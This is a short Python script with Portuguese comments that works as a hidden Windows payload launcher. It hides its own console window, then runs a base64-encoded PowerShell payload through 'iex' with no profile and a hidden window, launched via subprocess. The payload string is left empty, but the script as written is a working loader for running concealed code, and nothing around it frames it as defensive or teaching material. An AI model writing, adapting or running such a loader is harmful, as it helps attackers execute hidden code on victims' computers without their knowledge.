
import subprocess
import sys
import os

# Tenta esconder a janela do console (se estiver rodando em modo console)
if os.name == 'nt':
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        console = kernel32.GetConsoleWindow()
        if console:
            kernel32.ShowWindow(console, 0)
    except Exception:
        pass

# O Payload PowerShell Base64
payload_b64 = ""

# Comando PowerShell:
# -nop: No Profile (mais rápido)
# -w hidden: Esconde a janela
# -c iex: Importa e Executa o comando decodificado
cmd = 'powershell -nop -w hidden -c iex $([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("' + payload_b64 + '")))'

try:
    # Executa o comando
    subprocess.run(cmd, shell=True, check=False)
except Exception as e:
    print(f"Erro na execução do payload: {e}")
